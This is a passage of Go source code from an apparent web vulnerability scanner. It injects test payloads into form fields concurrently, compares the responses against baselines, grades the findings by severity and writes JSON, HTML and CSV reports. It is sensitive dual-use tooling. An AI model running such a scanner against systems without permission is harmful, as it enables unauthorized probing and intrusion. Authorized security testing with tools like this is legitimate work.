				time.Sleep(time.Duration(cfg.DelayMs) * time.Millisecond)
			}

			// Prepare form values
			v := url.Values{}
			for _, f := range cfg.Fields {
				if f == t.Field {
					v.Set(f, t.Payload)
				} else {
					v.Set(f, "test")
				}
			}

			// Execute request with retries
			var status int
			var body string
			var dur time.Duration
			var reqErr error

			for attempt := 0; attempt <= cfg.MaxRetries; attempt++ {
				status, body, dur, _, reqErr = fetchDetailed(client, cfg, t.URL, v)
				if reqErr == nil {
					break
				}
				if attempt < cfg.MaxRetries {
					time.Sleep(time.Second * time.Duration(attempt+1))
				}
			}

			finding := Finding{
				URL:                t.URL,
				Method:             cfg.Method,
				Field:              t.Field,
				Payload:            t.Payload,
				PayloadType:        determinePayloadType(t.Payload),
				Status:             status,
				BaselineStatus:     b.Status,
				ResponseLen:        len(body),
				BaselineLen:        b.Len,
				DurationMs:         dur.Milliseconds(),
				BaselineDurationMs: b.Duration.Milliseconds(),
				When:               time.Now(),
			}

			if reqErr != nil {
				finding.Flagged = false
				finding.Reason = fmt.Sprintf("request error: %v", reqErr)
				finding.Severity = "LOW"
				finding.Confidence = "Low"
				results <- finding
				continue
			}

			// Analyze response
			flagged, reason := analyze(b, status, body, dur, t.Payload)
			finding.Flagged = flagged
			finding.Reason = reason

			if flagged {
				finding.Severity = determineSeverity(reason, finding.PayloadType)
				finding.Confidence = determineConfidence(finding.Severity, reason)
			}

			results <- finding
		}
	}

	// Start workers
	workers := cfg.Concurrency
	if workers < 1 {
		workers = 1
	}
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go worker(i)
	}

	// Enqueue tasks
	total := 0
	for _, u := range cfg.URLs {
		if _, ok := baselines[u]; !ok {
			continue
		}
		for _, field := range cfg.Fields {
			for _, p := range payloads {
				tasks <- Task{URL: u, Field: field, Payload: p}
				total++
			}
		}
	}
	close(tasks)

	// Collect results
	findings := make([]Finding, 0, total)
	go func() {
		wg.Wait()
		close(results)
	}()

	flagged := 0
	highSev := 0
	mediumSev := 0
	lowSev := 0
	vulnByURL := make(map[string]int)

	for r := range results {
		if r.Flagged {
			flagged++
			vulnByURL[r.URL]++

			switch r.Severity {
			case "HIGH":
				highSev++
				fmt.Printf("🔴 [HIGH] %s field=%s type=%s\n", r.URL, r.Field, r.PayloadType)
				fmt.Printf("   Payload: %s\n", r.Payload)
				fmt.Printf("   Reason:  %s\n", r.Reason)
				fmt.Printf("   Confidence: %s\n\n", r.Confidence)
			case "MEDIUM":
				mediumSev++
				if cfg.Verbose {
					fmt.Printf("🟡 [MEDIUM] %s field=%s payload=%q => %s\n",
						r.URL, r.Field, r.Payload, r.Reason)
				}
			case "LOW":
				lowSev++
				if cfg.Verbose {
					fmt.Printf("🔵 [LOW] %s field=%s payload=%q => %s\n",
						r.URL, r.Field, r.Payload, r.Reason)
				}
			}
		}
		findings = append(findings, r)
	}

	// Create report
	report := Report{
		Version:     version,
		StartedAt:   started,
		FinishedAt:  time.Now(),
		Method:      cfg.Method,
		Fields:      cfg.Fields,
		URLs:        cfg.URLs,
		TimeoutSec:  cfg.TimeoutSec,
		Concurrency: workers,
		Findings:    findings,
		Summary: Summary{
			TotalTests:     total,
			Flagged:        flagged,
			HighSeverity:   highSev,
			MediumSeverity: mediumSev,
			LowSeverity:    lowSev,
			ByURL:          vulnByURL,
		},
	}

	// Write JSON report
	f, err := os.Create(cfg.JSONOutput)
	if err != nil {
		fmt.Printf("❌ Failed to create JSON report: %v\n", err)
		return
	}
	defer f.Close()

	e := json.NewEncoder(f)
	e.SetIndent("", "  ")
	if err := e.Encode(&report); err != nil {
		fmt.Printf("❌ Failed to write JSON report: %v\n", err)
		return
	}

	// Generate HTML report
	if err := generateHTMLReport(report, cfg.HTMLOutput); err != nil {
		fmt.Printf("❌ Failed to generate HTML report: %v\n", err)
	} else {
		fmt.Printf("✓ HTML report: %s\n", cfg.HTMLOutput)
	}

	// Generate CSV report if requested
	if cfg.CSVOutput != "" {
		if err := generateCSVReport(report, cfg.CSVOutput); err != nil {
			fmt.Printf("❌ Failed to generate CSV report: %v\n", err)
		} else {
			fmt.Printf("✓ CSV report:  %s\n", cfg.CSVOutput)
		}
	}

	// Print summary
	duration := report.FinishedAt.Sub(report.StartedAt)
	fmt.Printf("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
	fmt.Printf("📊 Summary:\n")
	fmt.Printf("   Total Tests: %d\n", total)
	fmt.Printf("   Duration:    %s\n", duration.Round(time.Millisecond))
	fmt.Printf("   Flagged:     %d\n", flagged)
	if flagged > 0 {
		fmt.Printf("   └─ High:     %d\n", highSev)
		fmt.Printf("   └─ Medium:   %d\n", mediumSev)
		fmt.Printf("   └─ Low:      %d\n", lowSev)
	}
	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
	fmt.Printf("✓ JSON report: %s\n", cfg.JSONOutput)

	if flagged > 0 {
		fmt.Printf("\n⚠️  VULNERABILITIES DETECTED!\n")
		fmt.Printf("   Review the reports for details.\n")
	} else {
		fmt.Printf("\n✅ No obvious vulnerabilities detected.\n")
	}

	fmt.Println("\n⚠️  IMPORTANT: Only test systems you own or have permission to test.")
}
